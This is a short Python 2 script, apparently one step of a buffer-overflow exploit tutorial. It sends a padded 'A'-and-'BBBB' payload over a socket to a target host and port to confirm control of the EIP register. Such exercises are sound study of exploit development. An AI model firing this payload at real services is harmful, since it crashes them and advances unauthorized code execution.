#!/usr/bin/python
import sys, socket

print "Now, we know the offset, we can manipulate the EIP with the answer to life the universe and everything(42424242)."
print "Re-run the application and start the script.\n"

if len(sys.argv) < 4:
	print "incorrect use of script, by Onurgule"
	print "python2 3_correct_offset.py ip port length"
	sys.exit()

offset = "A"*int(sys.argv[3]) + "BBBB"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((sys.argv[1],int(sys.argv[2])))
	s.send((offset))
	s.close()
	print "If the EIP is 42424242, we are good!"

except:
	print "Error"
	sys.exit()
